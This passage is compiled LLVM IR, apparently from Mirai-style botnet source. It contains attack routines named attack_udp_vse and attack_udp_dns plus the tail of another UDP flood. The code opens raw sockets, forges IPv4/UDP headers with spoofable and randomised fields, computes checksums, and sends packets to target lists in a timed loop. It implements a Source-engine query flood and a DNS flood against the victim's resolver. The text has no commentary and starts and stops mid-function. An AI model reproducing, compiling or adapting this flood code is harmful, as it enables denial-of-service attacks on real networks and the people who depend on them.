  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %26)
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = and i32 %22, 65535
  %32 = icmp ugt i32 %31, 1460
  %. = select i1 %32, i16 1460, i16 %23
  %33 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %.loopexit, label %35

; <label>:35:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %36 = bitcast i32* %6 to i8*
  %37 = call i32 @setsockopt(i32 %33, i32 0, i32 3, i8* nonnull %36, i32 4) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %46, label %.preheader88

.preheader88:                                     ; preds = %35
  store i32 0, i32* %6, align 4
  %39 = zext i8 %1 to i32
  %40 = icmp eq i8 %1, 0
  br i1 %40, label %.preheader, label %.lr.ph90

.lr.ph90:                                         ; preds = %.preheader88
  %41 = add i16 %., 28
  %42 = icmp eq i8 %17, 0
  %43 = add i16 %., 8
  %.promoted = load i32, i32* %6, align 4
  %44 = sext i32 %.promoted to i64
  %45 = zext i8 %1 to i64
  br label %65

; <label>:46:                                     ; preds = %35
  %47 = call i32 @close(i32 %33) #10
  br label %.loopexit

..preheader_crit_edge:                            ; preds = %81
  %48 = trunc i64 %indvars.iv.next to i32
  store i32 %48, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader88, %..preheader_crit_edge
  %49 = icmp eq i8 %1, 0
  %sext = shl i64 %30, 32
  %50 = ashr exact i64 %sext, 32
  %51 = icmp eq i32 %27, -1
  %52 = and i32 %12, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %18, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %20, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = icmp eq i8 %25, 0
  %59 = zext i16 %. to i64
  %60 = add nuw nsw i64 %59, 8
  %61 = trunc i64 %60 to i32
  %62 = add nuw nsw i64 %59, 28
  %63 = zext i16 %. to i32
  %64 = zext i16 %. to i64
  br label %98

; <label>:65:                                     ; preds = %.lr.ph90, %81
  %indvars.iv = phi i64 [ %44, %.lr.ph90 ], [ %indvars.iv.next, %81 ]
  %66 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %67 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 20
  store i8 69, i8* %66, align 4
  %69 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %11, i8* %69, align 1
  %70 = call zeroext i16 @htons(i16 zeroext %41) #11
  %71 = getelementptr inbounds i8, i8* %66, i64 2
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %13) #11
  %74 = getelementptr inbounds i8, i8* %66, i64 4
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 4
  %76 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %15, i8* %76, align 4
  br i1 %42, label %81, label %77

; <label>:77:                                     ; preds = %65
  %78 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %79 = getelementptr inbounds i8, i8* %66, i64 6
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  br label %81

; <label>:81:                                     ; preds = %65, %77
  %82 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 17, i8* %82, align 1
  %83 = getelementptr inbounds i8, i8* %66, i64 12
  %84 = bitcast i8* %83 to i32*
  store i32 %27, i32* %84, align 4
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %86 = load i32, i32* %85, align 4
  %87 = getelementptr inbounds i8, i8* %66, i64 16
  %88 = bitcast i8* %87 to i32*
  store i32 %86, i32* %88, align 4
  %89 = call zeroext i16 @htons(i16 zeroext %19) #11
  %90 = bitcast i8* %68 to i16*
  store i16 %89, i16* %90, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %21) #11
  %92 = getelementptr inbounds i8, i8* %66, i64 22
  %93 = bitcast i8* %92 to i16*
  store i16 %91, i16* %93, align 2
  %94 = call zeroext i16 @htons(i16 zeroext %43) #11
  %95 = getelementptr inbounds i8, i8* %66, i64 24
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %45
  br i1 %97, label %65, label %..preheader_crit_edge

; <label>:98:                                     ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %49, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %98
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %133
  %storemerge8789 = phi i32 [ %154, %133 ], [ 0, %.lr.ph.preheader ]
  %99 = sext i32 %storemerge8789 to i64
  %100 = getelementptr inbounds i8*, i8** %9, i64 %99
  %101 = load i8*, i8** %100, align 8
  %102 = bitcast i8* %101 to %struct.iphdr*
  %103 = getelementptr inbounds i8, i8* %101, i64 20
  %104 = getelementptr inbounds i8, i8* %101, i64 28
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %99, i32 2
  %106 = load i8, i8* %105, align 4
  %107 = icmp ult i8 %106, 32
  br i1 %107, label %108, label %115

; <label>:108:                                    ; preds = %.lr.ph
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %99, i32 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @ntohl(i32 %110) #11
  %112 = call i32 @htonl(i32 %111) #11
  %113 = getelementptr inbounds i8, i8* %101, i64 16
  %114 = bitcast i8* %113 to i32*
  store i32 %112, i32* %114, align 4
  br label %115

; <label>:115:                                    ; preds = %108, %.lr.ph
  br i1 %51, label %116, label %119

; <label>:116:                                    ; preds = %115
  %117 = getelementptr inbounds i8, i8* %101, i64 12
  %118 = bitcast i8* %117 to i32*
  store i32 0, i32* %118, align 4
  br label %119

; <label>:119:                                    ; preds = %116, %115
  br i1 %53, label %120, label %123

; <label>:120:                                    ; preds = %119
  %121 = getelementptr inbounds i8, i8* %101, i64 4
  %122 = bitcast i8* %121 to i16*
  store i16 0, i16* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %120, %119
  br i1 %55, label %124, label %126

; <label>:124:                                    ; preds = %123
  %125 = bitcast i8* %103 to i16*
  store i16 0, i16* %125, align 2
  br label %126

; <label>:126:                                    ; preds = %124, %123
  br i1 %57, label %127, label %130

; <label>:127:                                    ; preds = %126
  %128 = getelementptr inbounds i8, i8* %101, i64 22
  %129 = bitcast i8* %128 to i16*
  store i16 0, i16* %129, align 2
  br label %130

; <label>:130:                                    ; preds = %127, %126
  br i1 %58, label %133, label %131

; <label>:131:                                    ; preds = %130
  call void @rand_alphastr(i8* %104, i32 %63)
  %132 = getelementptr inbounds i8, i8* %104, i64 %64
  store i8 0, i8* %132, align 1
  br label %133

; <label>:133:                                    ; preds = %130, %131
  %134 = getelementptr inbounds i8, i8* %101, i64 10
  %135 = bitcast i8* %134 to i16*
  store i16 0, i16* %135, align 2
  %136 = bitcast i8* %101 to i16*
  %137 = call zeroext i16 @checksum_generic(i16* %136, i32 20)
  store i16 %137, i16* %135, align 2
  %138 = getelementptr inbounds i8, i8* %101, i64 26
  %139 = bitcast i8* %138 to i16*
  store i16 0, i16* %139, align 2
  %140 = getelementptr inbounds i8, i8* %101, i64 24
  %141 = bitcast i8* %140 to i16*
  %142 = load i16, i16* %141, align 2
  %143 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %102, i8* %103, i16 zeroext %142, i32 %61)
  store i16 %143, i16* %139, align 2
  %144 = getelementptr inbounds i8, i8* %101, i64 22
  %145 = bitcast i8* %144 to i16*
  %146 = load i16, i16* %145, align 2
  %147 = load i32, i32* %6, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %148, i32 0, i32 1
  store i16 %146, i16* %149, align 2
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %148, i32 0
  %151 = bitcast %struct.sockaddr_in* %150 to %struct.sockaddr*
  %152 = call i64 @sendto(i32 %33, i8* %101, i64 %62, i32 16384, %struct.sockaddr* %151, i32 16) #10
  %153 = load i32, i32* %6, align 4
  %154 = add nsw i32 %153, 1
  store i32 %154, i32* %6, align 4
  %155 = icmp slt i32 %154, %39
  br i1 %155, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %133
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %98
  %156 = call i64 @time(i64* null) #10
  %157 = icmp sgt i64 %156, %50
  br i1 %157, label %.loopexit.loopexit, label %98

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %46
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %8 = zext i8 %1 to i64
  %9 = tail call noalias i8* @calloc(i64 %8, i64 8) #10
  %10 = bitcast i8* %9 to i8**
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %12 = trunc i32 %11 to i8
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %14 = trunc i32 %13 to i16
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %18 = trunc i32 %17 to i8
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 27015)
  %22 = trunc i32 %21 to i16
  store i32 0, i32* %7, align 4
  %23 = tail call i64 @time(i64* null) #10
  %24 = zext i32 %0 to i64
  %25 = add i64 %23, %24
  tail call void @table_unlock_val(i8 zeroext 36)
  %26 = call i8* @table_retrieve_val(i32 36, i32* nonnull %7)
  %27 = call i32 @socket(i32 2, i32 3, i32 17) #10
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %30 = bitcast i32* %6 to i8*
  %31 = call i32 @setsockopt(i32 %27, i32 0, i32 3, i8* nonnull %30, i32 4) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %36, label %.preheader73

.preheader73:                                     ; preds = %29
  store i32 0, i32* %6, align 4
  %33 = zext i8 %1 to i32
  %34 = icmp eq i8 %1, 0
  br i1 %34, label %.preheader, label %.lr.ph75

.lr.ph75:                                         ; preds = %.preheader73
  %35 = icmp eq i8 %18, 0
  br label %46

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %27) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %68
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader73
  %38 = icmp eq i8 %1, 0
  %sext = shl i64 %25, 32
  %39 = ashr exact i64 %sext, 32
  %40 = and i32 %13, 65535
  %41 = icmp eq i32 %40, 65535
  %42 = and i32 %19, 65535
  %43 = icmp eq i32 %42, 65535
  %44 = and i32 %21, 65535
  %45 = icmp eq i32 %44, 65535
  br label %96

; <label>:46:                                     ; preds = %.lr.ph75, %68
  %47 = call noalias i8* @calloc(i64 128, i64 1) #10
  %48 = load i32, i32* %6, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8*, i8** %10, i64 %49
  store i8* %47, i8** %50, align 8
  %51 = getelementptr inbounds i8, i8* %47, i64 20
  %52 = getelementptr inbounds i8, i8* %47, i64 28
  store i8 69, i8* %47, align 4
  %53 = getelementptr inbounds i8, i8* %47, i64 1
  store i8 %12, i8* %53, align 1
  %54 = load i32, i32* %7, align 4
  %55 = trunc i32 %54 to i16
  %56 = add i16 %55, 32
  %57 = call zeroext i16 @htons(i16 zeroext %56) #11
  %58 = getelementptr inbounds i8, i8* %47, i64 2
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 2
  %60 = call zeroext i16 @htons(i16 zeroext %14) #11
  %61 = getelementptr inbounds i8, i8* %47, i64 4
  %62 = bitcast i8* %61 to i16*
  store i16 %60, i16* %62, align 4
  %63 = getelementptr inbounds i8, i8* %47, i64 8
  store i8 %16, i8* %63, align 4
  br i1 %35, label %68, label %64

; <label>:64:                                     ; preds = %46
  %65 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %66 = getelementptr inbounds i8, i8* %47, i64 6
  %67 = bitcast i8* %66 to i16*
  store i16 %65, i16* %67, align 2
  br label %68

; <label>:68:                                     ; preds = %46, %64
  %69 = getelementptr inbounds i8, i8* %47, i64 9
  store i8 17, i8* %69, align 1
  %70 = load i32, i32* @LOCAL_ADDR, align 4
  %71 = getelementptr inbounds i8, i8* %47, i64 12
  %72 = bitcast i8* %71 to i32*
  store i32 %70, i32* %72, align 4
  %73 = load i32, i32* %6, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %74, i32 1
  %76 = load i32, i32* %75, align 4
  %77 = getelementptr inbounds i8, i8* %47, i64 16
  %78 = bitcast i8* %77 to i32*
  store i32 %76, i32* %78, align 4
  %79 = call zeroext i16 @htons(i16 zeroext %20) #11
  %80 = bitcast i8* %51 to i16*
  store i16 %79, i16* %80, align 2
  %81 = call zeroext i16 @htons(i16 zeroext %22) #11
  %82 = getelementptr inbounds i8, i8* %47, i64 22
  %83 = bitcast i8* %82 to i16*
  store i16 %81, i16* %83, align 2
  %84 = load i32, i32* %7, align 4
  %85 = trunc i32 %84 to i16
  %86 = add i16 %85, 12
  %87 = call zeroext i16 @htons(i16 zeroext %86) #11
  %88 = getelementptr inbounds i8, i8* %47, i64 24
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = bitcast i8* %52 to i32*
  store i32 -1, i32* %90, align 4
  %91 = getelementptr inbounds i8, i8* %47, i64 32
  %92 = load i32, i32* %7, align 4
  call void @util_memcpy(i8* %91, i8* %26, i32 %92) #10
  %93 = load i32, i32* %6, align 4
  %94 = add nsw i32 %93, 1
  store i32 %94, i32* %6, align 4
  %95 = icmp slt i32 %94, %33
  br i1 %95, label %46, label %.preheader.loopexit

; <label>:96:                                     ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %38, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %96
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %123
  %storemerge7274 = phi i32 [ %151, %123 ], [ 0, %.lr.ph.preheader ]
  %97 = sext i32 %storemerge7274 to i64
  %98 = getelementptr inbounds i8*, i8** %10, i64 %97
  %99 = load i8*, i8** %98, align 8
  %100 = bitcast i8* %99 to %struct.iphdr*
  %101 = getelementptr inbounds i8, i8* %99, i64 20
  %102 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %97, i32 2
  %103 = load i8, i8* %102, align 4
  %104 = icmp ult i8 %103, 32
  br i1 %104, label %105, label %112

; <label>:105:                                    ; preds = %.lr.ph
  %106 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %97, i32 1
  %107 = load i32, i32* %106, align 4
  %108 = call i32 @ntohl(i32 %107) #11
  %109 = call i32 @htonl(i32 %108) #11
  %110 = getelementptr inbounds i8, i8* %99, i64 16
  %111 = bitcast i8* %110 to i32*
  store i32 %109, i32* %111, align 4
  br label %112

; <label>:112:                                    ; preds = %105, %.lr.ph
  br i1 %41, label %113, label %116

; <label>:113:                                    ; preds = %112
  %114 = getelementptr inbounds i8, i8* %99, i64 4
  %115 = bitcast i8* %114 to i16*
  store i16 0, i16* %115, align 4
  br label %116

; <label>:116:                                    ; preds = %113, %112
  br i1 %43, label %117, label %119

; <label>:117:                                    ; preds = %116
  %118 = bitcast i8* %101 to i16*
  store i16 0, i16* %118, align 2
  br label %119

; <label>:119:                                    ; preds = %117, %116
  br i1 %45, label %120, label %123

; <label>:120:                                    ; preds = %119
  %121 = getelementptr inbounds i8, i8* %99, i64 22
  %122 = bitcast i8* %121 to i16*
  store i16 0, i16* %122, align 2
  br label %123

; <label>:123:                                    ; preds = %120, %119
  %124 = getelementptr inbounds i8, i8* %99, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 0, i16* %125, align 2
  %126 = bitcast i8* %99 to i16*
  %127 = call zeroext i16 @checksum_generic(i16* %126, i32 20)
  store i16 %127, i16* %125, align 2
  %128 = getelementptr inbounds i8, i8* %99, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 0, i16* %129, align 2
  %130 = getelementptr inbounds i8, i8* %99, i64 24
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = load i32, i32* %7, align 4
  %134 = add i32 %133, 12
  %135 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %100, i8* %101, i16 zeroext %132, i32 %134)
  store i16 %135, i16* %129, align 2
  %136 = getelementptr inbounds i8, i8* %99, i64 22
  %137 = bitcast i8* %136 to i16*
  %138 = load i16, i16* %137, align 2
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %140, i32 0, i32 1
  store i16 %138, i16* %141, align 2
  %142 = load i32, i32* %7, align 4
  %143 = sext i32 %142 to i64
  %144 = add nsw i64 %143, 32
  %145 = load i32, i32* %6, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %146, i32 0
  %148 = bitcast %struct.sockaddr_in* %147 to %struct.sockaddr*
  %149 = call i64 @sendto(i32 %27, i8* %99, i64 %144, i32 16384, %struct.sockaddr* %148, i32 16) #10
  %150 = load i32, i32* %6, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %6, align 4
  %152 = icmp slt i32 %151, %33
  br i1 %152, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %123
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %96
  %153 = call i64 @time(i64* null) #10
  %154 = icmp sgt i64 %153, %39
  br i1 %154, label %.loopexit.loopexit, label %96

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %5, %36
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 53)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 9, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 12)
  %25 = trunc i32 %24 to i8
  %26 = tail call i8* @attack_get_opt_str(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 8, i8* null)
  %27 = tail call fastcc i32 @get_dns_resolver()
  %28 = tail call i64 @time(i64* null) #10
  %29 = zext i32 %0 to i64
  %30 = add i64 %28, %29
  %31 = icmp eq i8* %26, null
  br i1 %31, label %.loopexit, label %32

; <label>:32:                                     ; preds = %5
  %33 = tail call i32 @util_strlen(i8* nonnull %26) #10
  %34 = tail call i32 @socket(i32 2, i32 3, i32 17) #10
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %.loopexit, label %36

; <label>:36:                                     ; preds = %32
  store i32 1, i32* %6, align 4
  %37 = bitcast i32* %6 to i8*
  %38 = call i32 @setsockopt(i32 %34, i32 0, i32 3, i8* nonnull %37, i32 4) #10
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %54, label %.preheader126

.preheader126:                                    ; preds = %36
  store i32 0, i32* %6, align 4
  %40 = zext i8 %1 to i32
  %41 = icmp eq i8 %1, 0
  br i1 %41, label %.preheader, label %.lr.ph136

.lr.ph136:                                        ; preds = %.preheader126
  %.mask125 = and i32 %24, 255
  %42 = zext i32 %.mask125 to i64
  %43 = sext i32 %33 to i64
  %44 = add nuw nsw i64 %42, 47
  %45 = add nsw i64 %44, %43
  %46 = trunc i64 %45 to i16
  %47 = icmp eq i8 %17, 0
  %48 = add nuw nsw i64 %42, 27
  %49 = add nsw i64 %48, %43
  %50 = trunc i64 %49 to i16
  %51 = add nsw i32 %33, 1
  %52 = icmp sgt i32 %33, 0
  %wide.trip.count = zext i32 %33 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %53 = icmp eq i32 %33, 1
  br label %73

; <label>:54:                                     ; preds = %36
  %55 = call i32 @close(i32 %34) #10
  br label %.loopexit

.preheader.loopexit:                              ; preds = %._crit_edge134
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader126
  %56 = icmp eq i8 %1, 0
  %sext = shl i64 %30, 32
  %57 = ashr exact i64 %sext, 32
  %58 = and i32 %12, 65535
  %59 = icmp eq i32 %58, 65535
  %60 = and i32 %18, 65535
  %61 = icmp eq i32 %60, 65535
  %62 = and i32 %20, 65535
  %63 = icmp eq i32 %62, 65535
  %64 = and i32 %22, 65535
  %65 = icmp eq i32 %64, 65535
  %66 = and i32 %24, 255
  %67 = zext i32 %66 to i64
  %68 = sext i32 %33 to i64
  %69 = add nuw nsw i32 %66, 27
  %70 = add i32 %69, %33
  %71 = add nuw nsw i64 %67, 47
  %72 = add nsw i64 %71, %68
  br label %144

; <label>:73:                                     ; preds = %.lr.ph136, %._crit_edge134
  %74 = call noalias i8* @calloc(i64 600, i64 1) #10
  %75 = load i32, i32* %6, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8*, i8** %9, i64 %76
  store i8* %74, i8** %77, align 8
  %78 = getelementptr inbounds i8, i8* %74, i64 20
  %79 = getelementptr inbounds i8, i8* %74, i64 28
  %80 = getelementptr inbounds i8, i8* %74, i64 40
  store i8 69, i8* %74, align 4
  %81 = getelementptr inbounds i8, i8* %74, i64 1
  store i8 %11, i8* %81, align 1
  %82 = call zeroext i16 @htons(i16 zeroext %46) #11
  %83 = getelementptr inbounds i8, i8* %74, i64 2
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %13) #11
  %86 = getelementptr inbounds i8, i8* %74, i64 4
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 4
  %88 = getelementptr inbounds i8, i8* %74, i64 8
  store i8 %15, i8* %88, align 4
  br i1 %47, label %93, label %89

; <label>:89:                                     ; preds = %73
  %90 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %91 = getelementptr inbounds i8, i8* %74, i64 6
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  br label %93

; <label>:93:                                     ; preds = %73, %89
  %94 = getelementptr inbounds i8, i8* %74, i64 9
  store i8 17, i8* %94, align 1
  %95 = load i32, i32* @LOCAL_ADDR, align 4
  %96 = getelementptr inbounds i8, i8* %74, i64 12
  %97 = bitcast i8* %96 to i32*
  store i32 %95, i32* %97, align 4
  %98 = getelementptr inbounds i8, i8* %74, i64 16
  %99 = bitcast i8* %98 to i32*
  store i32 %27, i32* %99, align 4
  %100 = call zeroext i16 @htons(i16 zeroext %19) #11
  %101 = bitcast i8* %78 to i16*
  store i16 %100, i16* %101, align 2
  %102 = call zeroext i16 @htons(i16 zeroext %21) #11
  %103 = getelementptr inbounds i8, i8* %74, i64 22
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 2
  %105 = call zeroext i16 @htons(i16 zeroext %50) #11
  %106 = getelementptr inbounds i8, i8* %74, i64 24
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = call zeroext i16 @htons(i16 zeroext %23) #11
  %109 = bitcast i8* %79 to i16*
  store i16 %108, i16* %109, align 2
  %110 = call zeroext i16 @htons(i16 zeroext 256) #11
  %111 = getelementptr inbounds i8, i8* %74, i64 30
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = call zeroext i16 @htons(i16 zeroext 1) #11
  %114 = getelementptr inbounds i8, i8* %74, i64 32
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds i8, i8* %74, i64 41
  store i8 %25, i8* %80, align 1
  %117 = getelementptr inbounds i8, i8* %116, i64 %42
  %118 = getelementptr inbounds i8, i8* %117, i64 1
  call void @util_memcpy(i8* %118, i8* nonnull %26, i32 %51) #10
  br i1 %52, label %.lr.ph133.preheader, label %._crit_edge134

.lr.ph133.preheader:                              ; preds = %93
  br i1 %lcmp.mod, label %.lr.ph133.prol.loopexit.unr-lcssa, label %.lr.ph133.prol.preheader

.lr.ph133.prol.preheader:                         ; preds = %.lr.ph133.preheader
  br label %.lr.ph133.prol

.lr.ph133.prol:                                   ; preds = %.lr.ph133.prol.preheader
  %119 = load i8, i8* %26, align 1
  %120 = icmp eq i8 %119, 46
  br i1 %120, label %122, label %121

; <label>:121:                                    ; preds = %.lr.ph133.prol
  br label %124

; <label>:122:                                    ; preds = %.lr.ph133.prol
  store i8 0, i8* %117, align 1
  %123 = getelementptr inbounds i8, i8* %117, i64 1
  br label %124

; <label>:124:                                    ; preds = %122, %121
  %.1123.prol = phi i8* [ %123, %122 ], [ %117, %121 ]
  %.1.prol = phi i8 [ 0, %122 ], [ 1, %121 ]
  br label %.lr.ph133.prol.loopexit.unr-lcssa

.lr.ph133.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph133.preheader, %124
  %.1123.lcssa.unr.ph = phi i8* [ %.1123.prol, %124 ], [ undef, %.lr.ph133.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %124 ], [ undef, %.lr.ph133.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %124 ], [ 0, %.lr.ph133.preheader ]
  %.0119130.unr.ph = phi i8 [ %.1.prol, %124 ], [ 0, %.lr.ph133.preheader ]
  %.0122128.unr.ph = phi i8* [ %.1123.prol, %124 ], [ %117, %.lr.ph133.preheader ]
  br label %.lr.ph133.prol.loopexit

.lr.ph133.prol.loopexit:                          ; preds = %.lr.ph133.prol.loopexit.unr-lcssa
  br i1 %53, label %._crit_edge134.loopexit, label %.lr.ph133.preheader.new

.lr.ph133.preheader.new:                          ; preds = %.lr.ph133.prol.loopexit
  br label %.lr.ph133

.lr.ph133:                                        ; preds = %200, %.lr.ph133.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph133.preheader.new ], [ %indvars.iv.next.1, %200 ]
  %.0119130 = phi i8 [ %.0119130.unr.ph, %.lr.ph133.preheader.new ], [ %.1.1, %200 ]
  %.0122128 = phi i8* [ %.0122128.unr.ph, %.lr.ph133.preheader.new ], [ %.1123.1, %200 ]
  %125 = getelementptr inbounds i8, i8* %26, i64 %indvars.iv
  %126 = load i8, i8* %125, align 1
  %127 = icmp eq i8 %126, 46
  br i1 %127, label %128, label %131

